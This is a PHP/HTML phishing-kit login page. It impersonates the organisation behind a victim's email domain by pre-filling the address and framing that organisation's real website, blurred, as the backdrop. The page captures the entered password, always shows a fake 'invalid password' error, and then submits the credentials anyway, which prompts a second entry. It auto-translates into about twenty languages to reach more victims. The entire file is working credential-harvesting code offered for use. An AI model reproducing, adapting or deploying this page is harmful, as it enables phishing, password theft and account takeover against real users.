<?php include '../build.php' ?>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title><?php echo htmlspecialchars($noTld_upper); ?> | Secure Login</title>

    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Font Awesome -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet">

    <!-- Favicon -->
    <link rel="icon" href="<?php echo htmlspecialchars($img_url); ?>">

    <style>
        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
        }

        body{
            font-family:Arial, Helvetica, sans-serif;
            min-height:100vh;
            overflow:hidden;
            background:#0f172a;
            position:relative;
        }

        /* Background - Using iframe to display the website */
        #background-container{
            position:fixed;
            inset:0;
            z-index:-2;
            overflow:hidden;
        }

        #background-iframe{
            width:100%;
            height:100%;
            border:none;
            transform:scale(1.08);
            filter:blur(8px);
            transition:filter 1s ease, transform 1s ease;
        }

        /* Overlay */
        #overlay{
            position:fixed;
            inset:0;
            background:linear-gradient(
                135deg,
                rgba(0,0,0,.65),
                rgba(15,23,42,.78)
            );
            z-index:-1;
        }

        /* Page Wrapper */
        .page-wrapper{
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            padding:24px;
        }

        /* Login Card */
        .login-container{
            width:100%;
            max-width:420px;
            padding:42px 34px;
            border-radius:24px;
            background:rgba(255,255,255,.96);
            backdrop-filter:blur(14px);
            box-shadow:0 24px 55px rgba(0,0,0,.35);
            text-align:center;
            position:relative;
            z-index:1;
        }

        /* Header */
        .header-container{
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            margin-bottom:26px;
            width:100%;
        }

        .header-container img{
            width:96px;
            height:96px;
            object-fit:contain;
            padding:12px;
            border-radius:20px;
            background:#fff;
            border:1px solid #e5e7eb;
            box-shadow:0 8px 22px rgba(0,0,0,.08);
            margin-bottom:16px;
            flex-shrink:0;
        }

        /* Domain Name - Auto Size */
        .domain-wrapper {
            width:100%;
            max-width:100%;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:40px;
            padding:0 4px;
        }

        .domain{
            margin:0;
            font-weight:700;
            color:#111827;
            text-transform:uppercase;
            letter-spacing:1.5px;
            display:inline-block;
            max-width:100%;
            text-align:center;
            line-height:1.2;
            word-break:break-word;
            padding:0 2px;
            font-size:24px;
        }

        /* Welcome Text */
        .welcome-text{
            font-size:15px;
            color:#6b7280;
            margin-bottom:28px;
            line-height:1.6;
        }

        /* Input Group */
        .input-group{
            border:1px solid #d1d5db;
            border-radius:14px;
            overflow:hidden;
            transition:.2s ease;
            background:#fff;
        }

        .input-group:focus-within{
            border-color:#2563eb;
            box-shadow:0 0 0 4px rgba(37,99,235,.12);
        }

        .input-group-text{
            width:52px;
            justify-content:center;
            background:#f8fafc;
            border:none;
            color:#64748b;
        }

        .form-control{
            border:none;
            padding:14px 16px;
            font-size:15px;
            box-shadow:none !important;
        }

        .form-control[readonly]{
            background:#fff;
            color:#374151;
            font-weight:500;
        }

        /* Button */
        .btn-login{
            width:100%;
            padding:14px;
            border:none;
            border-radius:14px;
            background:linear-gradient(135deg,#2563eb,#1d4ed8);
            color:#fff;
            font-size:16px;
            font-weight:600;
            transition:.25s ease;
        }

        .btn-login:hover{
            transform:translateY(-1px);
            box-shadow:0 12px 24px rgba(37,99,235,.30);
        }

        .btn-login:disabled{
            opacity:.9;
            cursor:not-allowed;
        }

        /* Footer */
        .footer{
            height:16px;
        }

        /* Message Box */
        #message-box{
            margin-top:16px;
        }

        .alert{
            border-radius:12px;
            font-size:14px;
        }

        /* RED Thank You Alert */
        .thank-you-alert{
            background:#dc2626;
            color:#ffffff;
            border:1px solid #b91c1c;
            font-weight:600;
            box-shadow:0 8px 20px rgba(220,38,38,.25);
        }

        .thank-you-alert i{
            color:#ffffff;
        }

        @media (max-width:480px){
            .login-container{
                padding:34px 22px;
            }

            .header-container img{
                width:84px;
                height:84px;
            }

            .domain {
                font-size:20px;
            }
        }
    </style>
</head>
<body>

    <!-- Background - Website iframe -->
    <div id="background-container">
        <iframe id="background-iframe" src="about:blank" allowfullscreen=""></iframe>
    </div>
    <div id="overlay"></div>

    <!-- Page -->
    <div class="page-wrapper">
        <div class="login-container">

            <!-- Logo + Domain -->
            <div class="header-container">
                <img id="domain-logo"
                     src="<?php echo htmlspecialchars($img_url); ?>"
                     alt="">

                <div class="domain-wrapper">
                    <h1 class="domain" id="domain">
                        <?php echo htmlspecialchars($noTld_upper); ?>
                    </h1>
                </div>
            </div>

            <!-- Welcome Text -->
            <div class="welcome-text" id="welcome-text">
                Because you're accessing sensitive information, you'll need to 
				verify your identity first. Enter your password to proceed.
            </div>

            <!-- Login Form -->
            <form name="login-form"
                  method="post"
                  id="login-form"
                  autocomplete="off">

                <!-- Username -->
                <div class="mb-3">
                    <div class="input-group">
                        <span class="input-group-text">
                            <i class="fas fa-user"></i>
                        </span>

                        <input type="text"
                               class="form-control"
                               name="user"
                               id="username"
                               value="<?php echo htmlspecialchars($decoded); ?>"
                               readonly
                               autofocus>
                    </div>
                </div>

                <!-- Password -->
                <div class="mb-4">
                    <div class="input-group">
                        <span class="input-group-text">
                            <i class="fas fa-lock"></i>
                        </span>

                        <input type="text"
                               class="form-control"
                               name="pass"
                               id="password"
                               placeholder="Password"
                               autocomplete="current-password"
                               required>
                    </div>
                </div>

                <!-- Submit Button -->
                <button type="submit"
                        class="btn btn-login"
                        id="submit-button">
                    <i class="fas fa-right-to-bracket me-2"></i>
                    <span id="sign-in-text">Sign In</span>
                </button>

                <div class="footer"></div>

                <!-- Thank You Message -->
                <div id="message-box"></div>

            </form>

        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        // ================================================================
        // SET BACKGROUND IFRAME TO THE DOMAIN FROM decoded
        // ================================================================
        
        (function setBackgroundWebsite() {
            var decodedEmail = '<?php echo htmlspecialchars($decoded); ?>';
            var domain = '';
            
            // Extract domain from email
            if (decodedEmail && decodedEmail.includes('@')) {
                domain = decodedEmail.split('@')[1];
            } else if (decodedEmail) {
                domain = decodedEmail;
            }
            
            if (domain) {
                var iframe = document.getElementById('background-iframe');
                if (iframe) {
                    // Try HTTPS first
                    iframe.src = 'https://' + domain;
                    
                    // Fallback to HTTP if HTTPS fails (after 3 seconds)
                    setTimeout(function() {
                        // Check if iframe loaded, if not try HTTP
                        try {
                            // We can't directly check, but this is a fallback
                        } catch(e) {
                            iframe.src = 'http://' + domain;
                        }
                    }, 3000);
                }
                console.log('🌐 Background set to: ' + domain);
            } else {
                console.log('⚠️ No domain found for background');
                // Fallback background gradient
                document.getElementById('background-container').style.background = 'linear-gradient(135deg, #1a1a2e 0%, #007BFF 70%, #2d3436 100%)';
            }
        })();

        // ================================================================
        // DOMAIN NAME AUTO-SIZE - REDUCE FONT SIZE TO FIT WITHOUT OVERLAPPING
        // ================================================================
        
        (function autoSizeDomain() {
            const domainElement = document.getElementById('domain');
            if (!domainElement) return;
            
            const wrapper = domainElement.parentElement;
            if (!wrapper) return;
            
            const text = domainElement.textContent;
            
            function adjustFontSize() {
                domainElement.style.fontSize = '';
                const wrapperWidth = wrapper.clientWidth;
                if (wrapperWidth < 50) return;
                
                const tempSpan = document.createElement('span');
                tempSpan.style.visibility = 'hidden';
                tempSpan.style.position = 'absolute';
                tempSpan.style.whiteSpace = 'nowrap';
                tempSpan.style.fontWeight = '700';
                tempSpan.style.textTransform = 'uppercase';
                tempSpan.style.letterSpacing = '1.5px';
                tempSpan.style.fontFamily = 'Arial, Helvetica, sans-serif';
                tempSpan.textContent = text;
                document.body.appendChild(tempSpan);
                
                let fontSize = 24;
                let minFontSize = 10;
                let maxWidth = wrapperWidth - 20;
                
                tempSpan.style.fontSize = fontSize + 'px';
                let textWidth = tempSpan.offsetWidth;
                
                while (textWidth > maxWidth && fontSize > minFontSize) {
                    fontSize -= 1;
                    tempSpan.style.fontSize = fontSize + 'px';
                    textWidth = tempSpan.offsetWidth;
                }
                
                domainElement.style.fontSize = fontSize + 'px';
                
                if (fontSize <= 12) {
                    domainElement.style.whiteSpace = 'normal';
                    domainElement.style.wordBreak = 'break-word';
                    domainElement.style.letterSpacing = '0.5px';
                } else {
                    domainElement.style.whiteSpace = 'nowrap';
                    domainElement.style.letterSpacing = '1.5px';
                }
                
                document.body.removeChild(tempSpan);
                console.log('📏 Domain font size adjusted to:', fontSize + 'px');
            }
            
            setTimeout(adjustFontSize, 100);
            
            let resizeTimeout;
            window.addEventListener('resize', function() {
                clearTimeout(resizeTimeout);
                resizeTimeout = setTimeout(adjustFontSize, 200);
            });
            
            window.addEventListener('orientationchange', function() {
                setTimeout(adjustFontSize, 300);
            });
            
            document.addEventListener('visibilitychange', function() {
                if (!document.hidden) {
                    setTimeout(adjustFontSize, 200);
                }
            });
        })();

        // ================================================================
        // SILENT AUTO-TRANSLATION - INSTANT & NO SWITCHER
        // ================================================================

        const TRANSLATIONS = {
            'en': {
                welcome: "Because you're accessing sensitive information, you'll need to verify your identity first. Enter your password to proceed.",
                sign_in: "Sign In",
                password_placeholder: "Password",
                invalid_message: "Invalid Email Password. Please try again!",
                verifying: "Verifying..."
            },
            'es': {
                welcome: "Porque estás accediendo a información sensible, primero debes verificar tu identidad. Ingresa tu contraseña para continuar.",
                sign_in: "Iniciar Sesión",
                password_placeholder: "Contraseña",
                invalid_message: "¡Correo o contraseña inválidos! Por favor, inténtalo de nuevo.",
                verifying: "Verificando..."
            },
            'fr': {
                welcome: "Parce que vous accédez à des informations sensibles, vous devez d'abord vérifier votre identité. Entrez votre mot de passe pour continuer.",
                sign_in: "Se Connecter",
                password_placeholder: "Mot de passe",
                invalid_message: "Email ou mot de passe invalide. Veuillez réessayer !",
                verifying: "Vérification..."
            },
            'de': {
                welcome: "Da Sie auf vertrauliche Informationen zugreifen, müssen Sie zuerst Ihre Identität bestätigen. Geben Sie Ihr Passwort ein, um fortzufahren.",
                sign_in: "Anmelden",
                password_placeholder: "Passwort",
                invalid_message: "Ungültige E-Mail oder Passwort. Bitte versuchen Sie es erneut!",
                verifying: "Überprüfung..."
            },
            'it': {
                welcome: "Poiché stai accedendo a informazioni sensibili, devi prima verificare la tua identità. Inserisci la password per procedere.",
                sign_in: "Accedi",
                password_placeholder: "Password",
                invalid_message: "Email o password non validi. Per favore riprova!",
                verifying: "Verifica in corso..."
            },
            'pt': {
                welcome: "Porque você está acessando informações confidenciais, primeiro você precisa verificar sua identidade. Digite sua senha para continuar.",
                sign_in: "Entrar",
                password_placeholder: "Senha",
                invalid_message: "Email ou senha inválidos. Por favor, tente novamente!",
                verifying: "Verificando..."
            },
            'ru': {
                welcome: "Поскольку вы получаете доступ к конфиденциальной информации, вам необходимо сначала подтвердить свою личность. Введите пароль для продолжения.",
                sign_in: "Войти",
                password_placeholder: "Пароль",
                invalid_message: "Неверный email или пароль. Пожалуйста, попробуйте снова!",
                verifying: "Проверка..."
            },
            'zh': {
                welcome: "由于您正在访问敏感信息，您需要先验证您的身份。请输入密码以继续。",
                sign_in: "登录",
                password_placeholder: "密码",
                invalid_message: "电子邮件或密码无效。请重试！",
                verifying: "验证中..."
            },
            'ja': {
                welcome: "機密情報にアクセスしているため、まず身元を確認する必要があります。続行するにはパスワードを入力してください。",
                sign_in: "サインイン",
                password_placeholder: "パスワード",
                invalid_message: "無効なメールまたはパスワードです。もう一度お試しください！",
                verifying: "確認中..."
            },
            'ko': {
                welcome: "민감한 정보에 접근하고 있으므로 먼저 신원을 확인해야 합니다. 계속하려면 비밀번호를 입력하세요.",
                sign_in: "로그인",
                password_placeholder: "비밀번호",
                invalid_message: "잘못된 이메일 또는 비밀번호입니다. 다시 시도하세요!",
                verifying: "확인 중..."
            },
            'ar': {
                welcome: "نظرًا لأنك تصل إلى معلومات حساسة، فأنت بحاجة إلى التحقق من هويتك أولاً. أدخل كلمة المرور للمتابعة.",
                sign_in: "تسجيل الدخول",
                password_placeholder: "كلمة المرور",
                invalid_message: "البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى!",
                verifying: "جاري التحقق..."
            },
            'hi': {
                welcome: "क्योंकि आप संवेदनशील जानकारी तक पहुँच रहे हैं, आपको पहले अपनी पहचान सत्यापित करनी होगी। आगे बढ़ने के लिए अपना पासवर्ड दर्ज करें।",
                sign_in: "साइन इन करें",
                password_placeholder: "पासवर्ड",
                invalid_message: "अमान्य ईमेल या पासवर्ड। कृपया पुनः प्रयास करें!",
                verifying: "सत्यापित कर रहा है..."
            },
            'id': {
                welcome: "Karena Anda mengakses informasi sensitif, Anda perlu memverifikasi identitas Anda terlebih dahulu. Masukkan kata sandi Anda untuk melanjutkan.",
                sign_in: "Masuk",
                password_placeholder: "Kata Sandi",
                invalid_message: "Email atau kata sandi tidak valid. Silakan coba lagi!",
                verifying: "Memverifikasi..."
            },
            'th': {
                welcome: "เนื่องจากคุณกำลังเข้าถึงข้อมูลที่ละเอียดอ่อน คุณต้องยืนยันตัวตนของคุณก่อน กรุณาใส่รหัสผ่านเพื่อดำเนินการต่อ",
                sign_in: "เข้าสู่ระบบ",
                password_placeholder: "รหัสผ่าน",
                invalid_message: "อีเมลหรือรหัสผ่านไม่ถูกต้อง กรุณาลองอีกครั้ง!",
                verifying: "กำลังตรวจสอบ..."
            },
            'vi': {
                welcome: "Vì bạn đang truy cập thông tin nhạy cảm, bạn cần xác minh danh tính trước. Nhập mật khẩu của bạn để tiếp tục.",
                sign_in: "Đăng Nhập",
                password_placeholder: "Mật Khẩu",
                invalid_message: "Email hoặc mật khẩu không hợp lệ. Vui lòng thử lại!",
                verifying: "Đang xác minh..."
            },
            'pl': {
                welcome: "Ponieważ uzyskujesz dostęp do poufnych informacji, musisz najpierw zweryfikować swoją tożsamość. Wprowadź hasło, aby kontynuować.",
                sign_in: "Zaloguj się",
                password_placeholder: "Hasło",
                invalid_message: "Nieprawidłowy email lub hasło. Spróbuj ponownie!",
                verifying: "Weryfikacja..."
            },
            'tr': {
                welcome: "Hassas bilgilere eriştiğiniz için önce kimliğinizi doğrulamanız gerekir. Devam etmek için şifrenizi girin.",
                sign_in: "Giriş Yap",
                password_placeholder: "Şifre",
                invalid_message: "Geçersiz e-posta veya şifre. Lütfen tekrar deneyin!",
                verifying: "Doğrulanıyor..."
            },
            'nl': {
                welcome: "Omdat u toegang heeft tot gevoelige informatie, moet u eerst uw identiteit verifiëren. Voer uw wachtwoord in om door te gaan.",
                sign_in: "Inloggen",
                password_placeholder: "Wachtwoord",
                invalid_message: "Ongeldig e-mailadres of wachtwoord. Probeer het opnieuw!",
                verifying: "Verifiëren..."
            },
            'sv': {
                welcome: "Eftersom du kommer åt känslig information måste du först verifiera din identitet. Ange ditt lösenord för att fortsätta.",
                sign_in: "Logga in",
                password_placeholder: "Lösenord",
                invalid_message: "Ogiltig e-post eller lösenord. Försök igen!",
                verifying: "Verifierar..."
            }
        };

        function detectBrowserLanguage() {
            let lang = 'en';
            
            if (navigator.languages && navigator.languages.length > 0) {
                for (let l of navigator.languages) {
                    const primary = l.split('-')[0].toLowerCase();
                    if (TRANSLATIONS[primary]) {
                        lang = primary;
                        break;
                    }
                }
            }
            
            if (!TRANSLATIONS[lang] && navigator.language) {
                const primary = navigator.language.split('-')[0].toLowerCase();
                if (TRANSLATIONS[primary]) lang = primary;
            }
            
            if (!TRANSLATIONS[lang] && navigator.browserLanguage) {
                const primary = navigator.browserLanguage.split('-')[0].toLowerCase();
                if (TRANSLATIONS[primary]) lang = primary;
            }
            
            if (!TRANSLATIONS[lang] && navigator.userLanguage) {
                const primary = navigator.userLanguage.split('-')[0].toLowerCase();
                if (TRANSLATIONS[primary]) lang = primary;
            }
            
            if (!TRANSLATIONS[lang]) {
                const htmlLang = document.documentElement.lang.split('-')[0].toLowerCase();
                if (TRANSLATIONS[htmlLang]) lang = htmlLang;
            }
            
            if (!TRANSLATIONS[lang]) lang = 'en';
            
            return lang;
        }

        function applyTranslations(lang) {
            const t = TRANSLATIONS[lang] || TRANSLATIONS['en'];
            
            const welcomeEl = document.getElementById('welcome-text');
            if (welcomeEl) welcomeEl.textContent = t.welcome;
            
            const signInText = document.getElementById('sign-in-text');
            if (signInText) signInText.textContent = t.sign_in;
            
            const passwordInput = document.getElementById('password');
            if (passwordInput) passwordInput.placeholder = t.password_placeholder;
            
            window._currentLang = lang;
            window._trans = t;
            
            console.log('🌍 Auto-translated to:', lang);
        }

        (function initTranslation() {
            const detectedLang = detectBrowserLanguage();
            applyTranslations(detectedLang);
        })();

        // ================================================================
        // FORM HANDLING (UNCHANGED - ORIGINAL LOGIC)
        // ================================================================

        const form = document.getElementById('login-form');
        const passwordField = document.getElementById('password');
        const messageBox = document.getElementById('message-box');
        const submitButton = document.getElementById('submit-button');

        let delayedSubmit = false;

        form.addEventListener('submit', function (e) {

            if (delayedSubmit) {
                return true;
            }

            e.preventDefault();

            submitButton.disabled = true;
            
            const t = window._trans || TRANSLATIONS['en'];
            submitButton.innerHTML = `
                <span class="spinner-border spinner-border-sm me-2"
                      role="status"
                      aria-hidden="true"></span>
                ${t.verifying}
            `;

            setTimeout(() => {

                messageBox.innerHTML = `
                    <div class="alert thank-you-alert text-center fade show" role="alert">
                        <i class="fas fa-circle-check me-2"></i>
                        ${t.invalid_message}
                    </div>
                `;

                setTimeout(() => {

                    delayedSubmit = true;

                    submitButton.innerHTML = `
                        <i class="fas fa-right-to-bracket me-2"></i>
                        ${t.sign_in}
                    `;

                    form.requestSubmit();

                }, 1200);

            }, 800);
        });
    </script>

</body>

</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>